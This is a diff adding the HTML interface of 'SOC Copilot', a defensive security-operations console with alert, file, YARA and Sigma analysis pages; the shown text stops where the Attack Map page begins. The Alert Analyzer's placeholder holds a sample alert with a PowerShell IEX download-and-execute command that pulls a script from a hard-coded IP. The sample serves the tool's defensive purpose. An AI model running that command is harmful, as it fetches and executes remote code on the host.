@@ -1,0 +1,744 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>SOC Copilot</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Unbounded:wght@400;700;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="./styles.css?v=20260529-auto-sigma">
+</head>
+<body>
+<div class="welcome-screen" id="welcome-screen">
+  <div class="welcome-card">
+    <div class="welcome-grid">
+      <div>
+        <div class="welcome-kicker">SOC Copilot</div>
+        <div class="welcome-title">Analyze security files in a clear workflow: upload, chunk, index, then ask directly in chat.</div>
+        <div class="welcome-copy">
+          This project is built for SOC teams so one uploaded report or log becomes stored content, split into chunks, indexed for retrieval, and then used consistently across analysis and chat.
+        </div>
+        <div class="welcome-actions">
+          <button class="btn-primary" onclick="startApp()">Start</button>
+          <div class="welcome-note">Begin from File Analysis, then move to AI Chat and ask about the same indexed file.</div>
+        </div>
+      </div>
+      <div class="welcome-panel">
+        <div class="welcome-panel-title">How It Works</div>
+        <div class="welcome-steps">
+          <div class="welcome-step">
+            <div class="welcome-step-no">1</div>
+            <div>
+              <div class="welcome-step-title">Upload the file</div>
+              <div class="welcome-step-copy">Upload PDF, TXT, or LOG from File Analysis inside the same project.</div>
+            </div>
+          </div>
+          <div class="welcome-step">
+            <div class="welcome-step-no">2</div>
+            <div>
+              <div class="welcome-step-title">Let the system process it</div>
+              <div class="welcome-step-copy">The file is stored, split into chunks, and indexed automatically for retrieval.</div>
+            </div>
+          </div>
+          <div class="welcome-step">
+            <div class="welcome-step-no">3</div>
+            <div>
+              <div class="welcome-step-title">Analyze and ask</div>
+              <div class="welcome-step-copy">You get IOCs, rules, and summary, then chat answers from that same file content.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="app-shell hidden" id="app-shell">
+<div class="shell">
+
+<aside class="sidebar">
+  <div class="logo">
+    <div class="logo-brand">
+      <div class="logo-mark">🛡</div>
+      <div class="logo-stack">
+        <div class="logo-title">SOC</div>
+        <div class="logo-title logo-title-secondary">Copilot</div>
+        <div class="logo-sub">Threat Operations Console</div>
+      </div>
+    </div>
+  </div>
+  <nav class="nav">
+    <div class="nav-section">Main</div>
+    <div class="nav-item active" onclick="showPage('dashboard',this)"><span class="nav-icon">DB</span>Dashboard<span class="nav-badge" id="bdg">0</span></div>
+    <div class="nav-item" onclick="showPage('analyzer',this)"><span class="nav-icon">AL</span>Alert Analyzer</div>
+    <div class="nav-item" onclick="showPage('fileanalysis',this)"><span class="nav-icon">FA</span>File Analysis</div>
+    <div class="nav-item" onclick="showPage('investigation',this)"><span class="nav-icon">IN</span>Investigation</div>
+    <div class="nav-section">Intelligence</div>
+    <div class="nav-item" onclick="showPage('attackmap',this)"><span class="nav-icon">AM</span>Attack Map</div>
+    <div class="nav-item" onclick="showPage('ioc',this)"><span class="nav-icon">IO</span>IOC Enrichment</div>
+    <div class="nav-item" onclick="showPage('sigma',this)"><span class="nav-icon">SG</span>Sigma Converter</div>
+    <div class="nav-item" onclick="showPage('yarascanner',this)"><span class="nav-icon">YR</span>YARA Scanner</div>
+    <div class="nav-item" onclick="showPage('chat',this)"><span class="nav-icon">AI</span>AI Chat</div>
+    <div class="nav-item" onclick="showPage('reference',this)"><span class="nav-icon">EV</span>Event IDs</div>
+    <div class="nav-section">Records</div>
+    <div class="nav-item" onclick="showPage('history',this)"><span class="nav-icon">HS</span>History</div>
+    <div class="nav-section">Admin</div>
+    <div class="nav-item" onclick="showPage('admin',this)"><span class="nav-icon">AD</span>Admin Settings</div>
+  </nav>
+  <div class="sidebar-bottom">
+    <div class="status-bar"><span class="live-dot"></span><span id="llm-st">Ready</span></div>
+  </div>
+</aside>
+
+<div class="main">
+<header class="topbar">
+  <div class="topbar-title" id="ptitle">Dashboard</div>
+  <div class="topbar-sep"></div>
+  <div class="topbar-sub" id="psub">Security Overview</div>
+  <div class="topbar-right">
+    <span class="inline-label">Project</span>
+    <input id="proj-id" value="1" class="soc-input" style="width:60px;">
+    <input class="api-input" id="api-url" value="" placeholder="API URL">
+    <div class="threat-pill">Monitoring</div>
+  </div>
+</header>
+
+<div class="content">
+
+<!-- DASHBOARD -->
+<div class="page active" id="page-dashboard">
+  <div class="page-header dash-header">
+    <div>
+      <div class="page-title">Security Overview</div>
+      <div class="page-sub">Live SOC command view for detections, threat intelligence, and analyst activity</div>
+    </div>
+    <div class="dash-header-actions">
+      <span class="dash-live-pill"><span class="dash-live-dot"></span>Live SOC</span>
+      <button class="btn-sec" onclick="loadDash()">Refresh</button>
+    </div>
+  </div>
+  <div class="stats-row">
+    <div class="stat-card s-c dash-sev-card">
+      <div class="dash-stat-top"><span class="dash-stat-icon">!</span><span class="dash-activity-dot"></span></div>
+      <div class="stat-label">Critical</div><div class="stat-value" id="sc">-</div><div class="stat-meta" id="sc-meta">Active threats</div>
+    </div>
+    <div class="stat-card s-h dash-sev-card">
+      <div class="dash-stat-top"><span class="dash-stat-icon">H</span><span class="dash-activity-dot"></span></div>
+      <div class="stat-label">High</div><div class="stat-value" id="sh">-</div><div class="stat-meta" id="sh-meta">Need attention</div>
+    </div>
+    <div class="stat-card s-m dash-sev-card">
+      <div class="dash-stat-top"><span class="dash-stat-icon">M</span><span class="dash-activity-dot"></span></div>
+      <div class="stat-label">Medium</div><div class="stat-value" id="sm">-</div><div class="stat-meta" id="sm-meta">Under review</div>
+    </div>
+    <div class="stat-card s-t dash-sev-card">
+      <div class="dash-stat-top"><span class="dash-stat-icon">T</span><span class="dash-activity-dot"></span></div>
+      <div class="stat-label">Total</div><div class="stat-value" id="st">-</div><div class="stat-meta" id="st-meta">All analyses</div>
+    </div>
+  </div>
+  <div class="dash-ops-grid">
+    <div class="card dash-activity-card">
+      <div class="card-head"><span class="card-title">Analyst Activity Feed</span><span class="cbadge" style="background:rgba(255,45,85,.1);color:var(--red)" id="rec-cnt">-</span></div>
+      <div class="card-body"><div class="alert-list dash-feed" id="rec-list"><div class="dash-empty">Click Refresh</div></div></div>
+    </div>
+    <div class="card mitre-card">
+      <div class="card-head mitre-head">
+        <span class="card-title">MITRE ATT&CK</span>
+        <div class="dash-mitre-legend"><span class="lg-low"></span>Observed <span class="lg-med"></span>Active <span class="lg-high"></span>High Confidence</div>
+        <div class="mitre-toolbar">
+          <button class="btn-sec mitre-mini-btn" onclick="buildMitre()">Refresh</button>
+          <a class="btn-primary mitre-open-btn" href="https://attack.mitre.org/matrices/enterprise/" target="_blank" rel="noreferrer">Open Matrix</a>
+        </div>
+      </div>
+      <div class="card-body mitre-card-body">
+        <div class="dash-mitre-summary" id="dash-mitre-summary"></div>
+        <div class="dash-mitre-workspace">
+          <div class="mitre-grid" id="mitre-grid"></div>
+          <div class="dash-top-techniques" id="dash-top-techniques"></div>
+        </div>
+        <div class="dash-attack-path" id="dash-attack-path">Initial Access -> Execution -> C2 -> Exfiltration</div>
+        <div class="mitre-footer">Click any tile to open the matching MITRE ATT&CK technique page.</div>
+      </div>
+    </div>
+  </div>
+  <div class="dash-widget-grid" id="dash-widget-grid"></div>
+  <div class="dash-chart-grid" id="dash-chart-grid"></div>
+</div>
+
+<!-- ANALYZER -->
+<div class="page" id="page-analyzer">
+  <div class="page-header"><div><div class="page-title">Alert Analyzer</div><div class="page-sub">Single alert or log analysis with RAG + LLM</div></div></div>
+  <div class="two-col">
+    <div style="position:relative;">
+      <div class="input-card">
+        <div class="card-head"><span class="card-title">Input</span></div>
+        <div class="type-row">
+          <button class="tbtn active" onclick="setType(this,'alert')">ALERT</button>
+          <button class="tbtn" onclick="setType(this,'log')">LOG</button>
+          <button class="tbtn" onclick="setType(this,'malware_report')">MALWARE</button>
+          <button class="tbtn" onclick="setType(this,'cve')">CVE</button>
+        </div>
+        <textarea class="code-input" id="alert-input" placeholder="Paste alert, log, CVE ID, or malware report...&#10;&#10;Example:&#10;EventCode=4688 NewProcessName=powershell.exe&#10;ParentProcess=winword.exe&#10;CommandLine=IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.45/p.ps1')&#10;User=john.doe Hostname=WS-FINANCE-14"></textarea>
+        <div class="input-footer">
+          <button class="btn-primary" id="an-btn" onclick="analyzeAlert()"><span id="an-sp" style="display:none" class="spinner"></span>Analyze</button>
+          <span style="font-size:11px;color:var(--text3);margin-left:auto;">Uses current project from the top bar</span>
+        </div>
+      </div>
+      <div class="loading-overlay" id="an-loading"><div class="scan-line"><div class="scan-fill"></div></div><span>Analyzing with AI...</span></div>
+    </div>
+    <div class="result-panel">
+      <div class="card-head"><span class="card-title">Result</span><span class="cbadge" style="background:rgba(0,229,255,.1);color:var(--cyan)" id="r-uuid">-</span></div>
+      <div class="risk-big">
+        <div class="risk-num" id="r-score" style="color:var(--cyan)">-</div>
+        <div class="risk-label" id="r-level" style="color:var(--text3)">AWAITING INPUT</div>
+        <div class="risk-bar"><div class="risk-fill" id="r-bar" style="width:0%"></div></div>
+        <div class="risk-conf" id="r-conf">-</div>
+      </div>
+      <div class="result-body">
+        <div class="rs"><div class="rs-label">Summary</div><div class="rs-text" id="r-summary" style="color:var(--text3)">Run analysis to see results</div></div>
+        <div class="rs"><div class="rs-label">MITRE ATT&CK</div><div class="tags" id="r-mitre"></div></div>
+        <div class="rs"><div class="rs-label">IOCs</div><div class="ioc-list" id="r-iocs"></div></div>
+        <div class="rs"><div class="rs-label">Detection Rules</div><div id="r-rules"></div></div>
+        <div class="rs"><div class="rs-label">Recommended Actions</div><div class="action-list" id="r-actions"></div></div>
+        <div class="rs" id="feedback-row" style="display:none">
+          <div class="rs-label">Analyst Feedback</div>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <button class="tbtn" onclick="sendFeedback('correct')" style="color:var(--green)">Correct</button>
+            <button class="tbtn" onclick="sendFeedback('false_positive')">False Positive</button>
+            <button class="tbtn" onclick="sendFeedback('incorrect')" style="color:var(--red)">Incorrect</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- FILE ANALYSIS -->
+<div class="page" id="page-fileanalysis">
+  <div class="page-header"><div><div class="page-title">File Analysis</div><div class="page-sub">Upload the file once, then the system stores it, splits it into chunks, indexes it for RAG, analyzes it, and links chat to the same project.</div></div></div>
+  <div class="two-col">
+    <div>
+      <div class="card" style="margin-bottom:14px">
+        <div class="card-head"><span class="card-title">Upload & Analyze</span></div>
+        <div class="card-body">
+          <div class="upload-zone" id="fa-zone" onclick="document.getElementById('fa-input').click()" ondrop="faDrop(event)" ondragover="faDragOver(event)" ondragleave="document.getElementById('fa-zone').classList.remove('dragging')">
+            <div class="upload-icon">FILE</div><div class="upload-text">Drop file or click to browse</div><div class="upload-sub">PDF, TXT, LOG</div>
+          </div>
+          <input type="file" id="fa-input" accept=".pdf,.txt,.log" style="display:none" onchange="faSelect(event)">
+          <div id="fa-info" style="display:none;margin-top:10px;padding:9px;background:var(--bg3);border-radius:6px;font-size:11px;color:var(--text2);"></div>
+          <div class="file-flow-note">Flow: upload the file, process and chunk it, push vectors, run analysis, then ask AI Chat about the same indexed file.</div>
+          <div class="inline-controls">
+            <span class="inline-label">Chunk size</span>
+            <input id="chunk-sz" value="100" class="soc-input" style="width:78px;">
+            <span class="inline-label">Uses current project from the top bar</span>
+          </div>
+          <div style="display:flex;gap:8px;margin-top:12px;align-items:center;">
+            <select id="fa-type" class="soc-select" style="flex:1">
+              <option value="malware_report">Malware Report</option>
+              <option value="alert">Alert File</option>
+              <option value="cve">CVE Document</option>
+              <option value="log">Log File</option>
+            </select>
+            <button class="btn-primary" id="fa-btn" onclick="uploadAnalyze()">Analyze</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="file-analysis-results">
+      <div class="result-panel">
+        <div class="card-head">
+          <span class="card-title">File Analysis Result</span>
+          <button class="btn-sec incident-report-btn" onclick="scanFileAnalysisWithYara()">Run YARA Scan</button>
+          <button class="btn-sec incident-report-btn" onclick="openIncidentReportModal()">Generate Incident Report</button>
+        </div>
+        <div class="risk-big">
+          <div class="risk-num" id="fa-score" style="color:var(--cyan)">-</div>
+          <div class="risk-label" id="fa-level" style="color:var(--text3)">AWAITING FILE</div>
+          <div class="risk-bar"><div class="risk-fill" id="fa-bar" style="width:0%"></div></div>
+          <div class="risk-conf" id="fa-conf">-</div>
+        </div>
+        <div class="result-body">
+          <div class="rs"><div class="rs-label">Summary</div><div class="rs-text" id="fa-summary" style="color:var(--text3)">Upload a file to analyze</div></div>
+          <div class="rs"><div class="rs-label">MITRE ATT&CK</div><div class="tags" id="fa-mitre"></div></div>
+          <div class="rs"><div class="rs-label">IOCs</div><div class="ioc-list" id="fa-iocs"></div></div>
+          <div class="rs"><div class="rs-label">Detection Rules</div><div id="fa-rules"></div></div>
+          <div class="rs"><div class="rs-label">Actions</div><div class="action-list" id="fa-actions"></div></div>
+        </div>
+      </div>
+      <div class="attack-timeline-panel">
+        <div class="card-head">
+          <span class="card-title">Attack Timeline</span>
+          <span class="cbadge attack-timeline-count" id="attack-timeline-count">0</span>
+        </div>
+        <div class="attack-timeline-body" id="attack-timeline">
+          <div class="attack-timeline-empty">Upload and analyze a TXT or LOG file to build a chronological attack timeline.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- INVESTIGATION -->
+<div class="page" id="page-investigation">
+  <div class="page-header">
+    <div><div class="page-title">Investigation Chain</div><div class="page-sub">Multi-event correlation - attack story - kill chain</div></div>
+    <div style="margin-left:auto;display:flex;gap:8px;">
+      <button class="btn-sec" onclick="clearEvs()">Clear</button>
+      <button class="btn-primary" id="inv-btn" onclick="runInv()">Investigate</button>
+    </div>
+  </div>
+  <div class="inv-layout">
+    <div class="events-panel">
+      <div class="card-head"><span class="card-title">Events</span><span class="cbadge" style="background:rgba(0,229,255,.1);color:var(--cyan)" id="ev-cnt">0</span></div>
+      <div class="events-list" id="ev-list"></div>
+      <div class="add-ev">
+        <textarea class="add-ev-input" id="new-ev" placeholder="Paste a log line or event..."></textarea>
+        <button class="add-ev-btn" onclick="addEv()">+ Add Event</button>
+      </div>
+    </div>
+    <div style="position:relative;">
+      <div class="chain-result" id="chain-result">
+        <div class="card-head"><span class="card-title">Attack Chain</span><span class="cbadge" style="background:rgba(255,45,85,.1);color:var(--red)" id="chain-sev">-</span></div>
+        <div id="chain-content" style="padding:30px;text-align:center;color:var(--text3);font-size:11px;">Add at least 2 events and click Investigate</div>
+      </div>
+      <div class="loading-overlay" id="inv-loading"><div class="scan-line"><div class="scan-fill"></div></div><span>Correlating events...</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- SIGMA CONVERTER -->
+<div class="page" id="page-sigma">
+  <div class="page-header">
+    <div><div class="page-title">Sigma Converter</div><div class="page-sub">Convert Sigma YAML into SIEM, IDS, EDR, and XDR queries</div></div>
+    <div style="margin-left:auto;display:flex;gap:8px;">
+      <button class="btn-sec" id="sigma-sample-btn" onclick="loadSampleSigma()">Sample</button>
+      <button class="btn-sec" id="sigma-clear-btn" onclick="clearSigmaConverter()">Clear</button>
+      <button class="btn-primary" id="sigma-convert-btn" onclick="convertSigmaField()">Convert</button>
+    </div>
+  </div>
+  <div class="sigma-page-layout">
+    <div class="sigma-workbench">
+      <div class="card-head"><span class="card-title">Sigma Input</span><span class="cbadge" id="sigma-file-name">YAML</span></div>
+      <div class="card-body">
+        <div class="sigma-source-row">
+          <button class="tbtn active" data-source-mode="text" onclick="focusSigmaText()">TEXT INPUT</button>
+          <button class="tbtn" data-source-mode="file" onclick="openSigmaFilePicker()">UPLOAD FILE</button>
+        </div>
+        <div class="upload-zone sigma-upload-zone" id="sigma-zone" onclick="document.getElementById('sigma-file-input').click()" ondrop="sigmaDrop(event)" ondragover="sigmaDragOver(event)" ondragleave="document.getElementById('sigma-zone').classList.remove('dragging')">
+          <div class="upload-icon">SIG</div>
+          <div class="upload-text">Drop Sigma rule or click to browse</div>
+          <div class="upload-sub">YML, YAML</div>
+        </div>
+        <input type="file" id="sigma-file-input" accept=".yml,.yaml" style="display:none" onchange="sigmaSelectFile(event)">
+        <div class="sigma-input-label">Paste Sigma YAML Text</div>
+        <textarea class="sigma-converter-input" id="sigma-converter-input" placeholder="Paste Sigma YAML..."></textarea>
+        <div class="sigma-platform-panel">
+          <div class="sigma-platform-head">
+            <span>Platforms</span>
+            <button class="btn-sec sigma-mini-btn" onclick="setSigmaPlatforms(true)">All</button>
+            <button class="btn-sec sigma-mini-btn" onclick="setSigmaPlatforms(false)">None</button>
+          </div>
+          <div class="sigma-platform-grid" id="sigma-platform-grid">
+            <label><input type="checkbox" value="splunk" checked>Splunk SPL</label>
+            <label><input type="checkbox" value="sentinel_kql" checked>Sentinel KQL</label>
+            <label><input type="checkbox" value="elastic_kql" checked>Elastic KQL</label>
+            <label><input type="checkbox" value="elastic_eql" checked>Elastic EQL</label>
+            <label><input type="checkbox" value="opensearch_dql" checked>OpenSearch DQL</label>
+            <label><input type="checkbox" value="qradar_aql" checked>QRadar AQL</label>
+            <label><input type="checkbox" value="sumologic" checked>Sumo Logic</label>
+            <label><input type="checkbox" value="graylog" checked>Graylog</label>
+            <label><input type="checkbox" value="logscale" checked>LogScale</label>
+            <label><input type="checkbox" value="snort" checked>Snort</label>
+            <label><input type="checkbox" value="suricata" checked>Suricata</label>
+            <label><input type="checkbox" value="crowdstrike" checked>CrowdStrike</label>
+            <label><input type="checkbox" value="defender_xdr" checked>Defender XDR</label>
+            <label><input type="checkbox" value="sentinelone_dv" checked>SentinelOne DV</label>
+            <label><input type="checkbox" value="carbon_black" checked>Carbon Black</label>
+            <label><input type="checkbox" value="google_secops" checked>Google SecOps</label>
+            <label><input type="checkbox" value="osquery_sql" checked>osquery SQL</label>
+          </div>
+        </div>
+        <div class="sigma-actions">
+          <button class="btn-sec" onclick="validateSigmaField()">Validate</button>
+          <button class="btn-primary" onclick="convertSigmaField()">Convert Selected</button>
+        </div>
+      </div>
+    </div>
+    <div class="sigma-preview">
+      <div class="card-head">
+        <span class="card-title">Query Preview</span>
+        <button class="btn-sec" id="sigma-export-btn" onclick="exportSigmaConversions()" style="margin-left:auto;">Export</button>
+      </div>
+      <div class="sigma-converter-results" id="sigma-converter-results">
+        <div class="sigma-converter-empty">Paste or upload Sigma, then convert</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- YARA SCANNER -->
+<div class="page" id="page-yarascanner">
+  <div class="page-header">
+    <div><div class="page-title">YARA Scanner</div><div class="page-sub">Static detection against uploaded YARA rules from the project knowledge base</div></div>
+  </div>
+  <div class="yara-layout">
+    <div class="yara-workbench">
+      <div class="card-head"><span class="card-title">Suspicious File</span></div>
+      <div class="card-body">
+        <div class="upload-zone yara-upload-zone" id="yara-zone" onclick="document.getElementById('yara-file-input').click()" ondrop="yaraDrop(event)" ondragover="yaraDragOver(event)" ondragleave="document.getElementById('yara-zone').classList.remove('dragging')">
+          <div class="upload-icon">SCAN</div>
+          <div class="upload-text">Drop suspicious file or click to browse</div>
+          <div class="upload-sub">Static scan only. Files are never executed.</div>
+        </div>
+        <input type="file" id="yara-file-input" style="display:none" onchange="yaraSelectFile(event)">
+        <div id="yara-file-info" class="admin-status-box" style="display:none"></div>
+        <div class="admin-field admin-field-spaced">
+          <div class="admin-field-label">Scan Mode</div>
+          <select id="yara-scan-mode" class="soc-select admin-full">
+            <option value="fast">Fast Scan</option>
+            <option value="full">Full Scan</option>
+          </select>
+        </div>
+        <div class="admin-actions">
+          <button class="btn-sec" onclick="generateSafeYaraSample()">Generate Safe Test Sample</button>
+          <button class="btn-primary" id="yara-scan-btn" onclick="runYaraScan()">Run YARA Scan</button>
+          <span class="inline-label">Uses current project KB YARA Rules</span>
+        </div>
+        <div id="yara-generated-rule" class="yara-generated-rule" style="display:none"></div>
+      </div>
+    </div>
+    <div style="position:relative;">
+      <div class="yara-results-panel">
+        <div class="card-head"><span class="card-title">Scan Results</span><span class="cbadge" id="yara-match-count">0</span></div>
+        <div id="yara-results" class="yara-results">
+          <div class="yara-empty">Upload a suspicious file and run a static YARA scan.</div>
+        </div>
+      </div>
+      <div class="loading-overlay" id="yara-loading"><div class="scan-line"><div class="scan-fill"></div></div><span>Scanning with YARA rules...</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- CHAT -->
+<div class="page" id="page-chat">
+  <div class="page-header">
+    <div><div class="page-title">AI Security Chat</div><div class="page-sub">Ask questions from the file you uploaded and indexed in the current project.</div></div>
+    <button class="btn-sec" onclick="clearChat()" style="margin-left:auto">Clear</button>
+  </div>
+  <div class="chat-msgs" id="chat-msgs">
+    <div class="chat-msg"><div class="chat-av av-ai">AI</div><div class="chat-bubble cb-ai">Hello! Upload and analyze a file first, then ask me questions and I will answer from the indexed content of that same file.</div></div>
+  </div>
+  <div class="chat-filter-row">
+    <div>
+      <div class="admin-field-label">Knowledge Base Source</div>
+      <select id="chat-source-type" class="soc-select chat-filter-select">
+        <option value="auto">Auto Detect</option>
+        <option value="">All Sources</option>
+        <option value="malware_report">Malware Reports</option>
+        <option value="yara_rule">YARA Rules</option>
+        <option value="sigma_rule">Sigma Rules</option>
+        <option value="ioc_list">IOC Lists</option>
+      </select>
+    </div>
+    <div>
+      <div class="admin-field-label">Source Name</div>
+      <input id="chat-source-name" class="soc-input chat-filter-input" placeholder="Optional source name filter">
+    </div>
+  </div>
+  <div class="chat-row">
+    <textarea class="chat-ta" id="chat-in" placeholder="Ask a security question... (Enter to send, Shift+Enter for newline)"></textarea>
+    <button class="btn-primary" onclick="sendChat()" id="chat-btn">Send</button>
+  </div>
+</div>
+
+<!-- REFERENCE -->
+<div class="page" id="page-reference">
+  <div class="page-header"><div><div class="page-title">Event ID Reference</div><div class="page-sub">Windows - Sysmon - Log types</div></div></div>
+  <div class="ref-layout">
+    <div class="ref-sidebar">
+      <div style="padding:12px;border-bottom:1px solid var(--border);">
+        <input class="ref-search-input" id="ref-srch" placeholder="Search event ID or name..." oninput="filterRef(this.value)">
+      </div>
+      <div style="display:flex;gap:5px;padding:8px 10px;border-bottom:1px solid var(--border);">
+        <button class="tbtn active" onclick="setRefP('all',this)" style="font-size:8px">ALL</button>
+        <button class="tbtn" onclick="setRefP('windows',this)" style="font-size:8px">WINDOWS</button>
+        <button class="tbtn" onclick="setRefP('sysmon',this)" style="font-size:8px">SYSMON</button>
+      </div>
+      <div class="ref-list" id="ref-list" style="padding:8px;"></div>
+    </div>
+    <div class="ref-detail" id="ref-detail"><div style="color:var(--text3);font-size:11px;text-align:center;padding:40px;">Select an Event ID to view details</div></div>
+  </div>
+</div>
+
+<!-- HISTORY -->
+<div class="page" id="page-history">
+  <div class="page-header">
+    <div><div class="page-title">Analysis History</div><div class="page-sub">All past analyses</div></div>
+    <div style="margin-left:auto;display:flex;gap:8px;align-items:center;">
+      <select id="hist-filt" class="soc-select" onchange="loadHist()">
+        <option value="">All Levels</option>
+        <option value="critical">Critical</option>
+        <option value="high">High</option>
+        <option value="medium">Medium</option>
+        <option value="low">Low</option>
+      </select>
+      <button class="btn-sec" onclick="loadHist()">Refresh</button>
+    </div>
+  </div>
+  <div class="hist-table">
+    <div class="hist-head"><span>UUID</span><span>Title</span><span>Type</span><span>Risk</span><span>Score</span><span>Time</span></div>
+    <div id="hist-rows"><div style="padding:20px;text-align:center;color:var(--text3);font-size:11px;">Click Refresh to load</div></div>
+  </div>
+</div>
+
+<!-- ADMIN -->
+<div class="page" id="page-admin">
+  <div class="page-header">
+    <div>
+      <div class="page-title">Admin Settings</div>
+      <div class="page-sub">Curate the project knowledge base with typed uploads, URL ingestion, and source visibility.</div>
+    </div>
+    <button class="btn-sec" onclick="loadKBStats()" style="margin-left:auto">Refresh Status</button>
+  </div>
+
+  <div class="admin-tabs">
+    <button class="tbtn active" onclick="setAdminTab('upload',this)">UPLOAD TO KB</button>
+    <button class="tbtn" onclick="setAdminTab('fetch',this)">FETCH FROM URL</button>
+    <button class="tbtn" onclick="setAdminTab('status',this)">KB STATUS</button>
+  </div>
+
+  <div class="admin-tab-panel active" id="admin-panel-upload">
+    <div class="card">
+      <div class="card-head"><span class="card-title">Upload To Knowledge Base</span></div>
+      <div class="card-body">
+        <div class="admin-grid">
+          <div>
+            <div class="admin-field-label">Content Type</div>
+            <select id="admin-content-type" class="soc-select admin-full" onchange="setAdminChunkDefault()">
+              <option value="malware_report">Malware Report</option>
+              <option value="cve">CVE Data</option>
+              <option value="threat_intel">Threat Intel</option>
+              <option value="alert_sample">Alert Sample</option>
+              <option value="log_sample">Log Sample</option>
+              <option value="sigma_rule">Sigma Rules</option>
+              <option value="yara_rule">YARA Rules</option>
+              <option value="mitre_data">MITRE Data</option>
+            </select>
+          </div>
+          <div>
+            <div class="admin-field-label">Chunk Size</div>
+            <input id="admin-chunk-size" class="soc-input admin-full" type="number" min="50" max="5000" step="50" value="1200">
+          </div>
+          <div>
+            <div class="admin-field-label">Source Name</div>
+            <input id="admin-source-name" class="soc-input admin-full" placeholder="Mandiant 2024">
+          </div>
+        </div>
+        <div class="admin-field admin-field-spaced">
+          <div class="admin-field-label">Description</div>
+          <input id="admin-description" class="soc-input admin-full" placeholder="Optional source description">
+        </div>
+        <div class="upload-zone admin-upload-zone" id="admin-upload-zone" onclick="document.getElementById('admin-file-input').click()" ondrop="adminDrop(event)" ondragover="adminDragOver(event)" ondragleave="document.getElementById('admin-upload-zone').classList.remove('dragging')">
+          <div class="upload-icon">KB</div>
+          <div class="upload-text">Drop file here or click to browse</div>
+          <div class="upload-sub">Supports PDF, TXT, LOG, JSON, YAML, YARA, Sigma</div>
+        </div>
+        <input type="file" id="admin-file-input" accept=".pdf,.txt,.log,.json,.yaml,.yml,.sigma,.yar,.yara,.gz,.html,.htm" multiple style="display:none" onchange="adminSelectFile(event)">
+        <div id="admin-upload-file-info" class="admin-status-box" style="display:none"></div>
+        <div class="admin-actions">
+          <button class="btn-primary" id="admin-upload-btn" onclick="adminUploadFile()">Upload & Index</button>
+          <span class="inline-label">Uses current project from the top bar</span>
+        </div>
+        <div id="admin-upload-status" class="admin-status-box">Ready to ingest typed sources into the project knowledge base.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="admin-tab-panel" id="admin-panel-fetch">
+    <div class="card">
+      <div class="card-head"><span class="card-title">Fetch From URL</span></div>
+      <div class="card-body">
+        <div class="admin-field">
+          <div class="admin-field-label">URL</div>
+          <input id="admin-url" class="soc-input admin-full" placeholder="https://...">
+        </div>
+        <div class="admin-grid admin-field-spaced">
+          <div>
+            <div class="admin-field-label">Content Type</div>
+            <select id="admin-url-type" class="soc-select admin-full">
+              <option value="mitre_data">MITRE Data</option>
+              <option value="cve">CVE Data</option>
+              <option value="malware_report">Malware Report</option>
+              <option value="threat_intel">Threat Intel</option>
+              <option value="alert_sample">Alert Sample</option>
+              <option value="log_sample">Log Sample</option>
+              <option value="sigma_rule">Sigma Rules</option>
+              <option value="yara_rule">YARA Rules</option>
+            </select>
+          </div>
+          <div>
+            <div class="admin-field-label">Source Name</div>
+            <input id="admin-url-source" class="soc-input admin-full" placeholder="MITRE ATT&CK Enterprise">
+          </div>
+        </div>
+        <div class="admin-field admin-field-spaced">
+          <div class="admin-field-label">Description</div>
+          <input id="admin-url-description" class="soc-input admin-full" placeholder="Optional description">
+        </div>
+        <div class="admin-quick">
+          <div class="admin-field-label">Quick Fill</div>
+          <div class="admin-quick-list">
+            <button class="btn-sec" onclick="quickFill('MITRE ATT&CK')">MITRE ATT&CK</button>
+            <button class="btn-sec" onclick="quickFill('NVD 2024')">NVD 2024</button>
+            <button class="btn-sec" onclick="quickFill('Malware Bazaar')">Malware Bazaar</button>
+            <button class="btn-sec" onclick="quickFill('CISA Advisories')">CISA Advisories</button>
+            <button class="btn-sec" onclick="quickFill('Sigma Rules')">Sigma Rules</button>
+          </div>
+        </div>
+        <div class="admin-actions">
+          <button class="btn-primary" id="admin-fetch-btn" onclick="adminFetchURL()">Fetch & Index</button>
+          <span class="inline-label">Remote content will be fetched, normalized, chunked, and indexed.</span>
+        </div>
+        <div id="admin-fetch-status" class="admin-status-box">Use Quick Fill for common feeds or paste any supported URL.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="admin-tab-panel" id="admin-panel-status">
+    <div class="two-col">
+      <div class="card">
+        <div class="card-head"><span class="card-title">Knowledge Base Summary</span></div>
+        <div class="card-body">
+          <div id="admin-kb-summary" class="admin-status-summary">
+            <div class="admin-summary-item"><span>Total Vectors</span><strong>-</strong></div>
+            <div class="admin-summary-item"><span>Documents</span><strong>-</strong></div>
+            <div class="admin-summary-item"><span>Total Chunks</span><strong>-</strong></div>
+          </div>
+          <div class="admin-actions admin-actions-tight">
+            <button class="btn-sec" onclick="loadKBStats()">Refresh</button>
+            <button class="btn-sec admin-danger" onclick="clearKB()">Clear All</button>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-head"><span class="card-title">By Content Type</span></div>
+        <div class="card-body">
+          <div id="admin-kb-types" class="admin-list-block">
+            <div class="admin-empty">No indexed content yet.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="card admin-sources-card">
+      <div class="card-head"><span class="card-title">Recent Sources</span></div>
+      <div class="card-body">
+        <div id="admin-kb-sources" class="admin-list-block">
+          <div class="admin-empty">No sources available.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ATTACK MAP -->
+<div class="page" id="page-attackmap">
+  <div class="page-header">
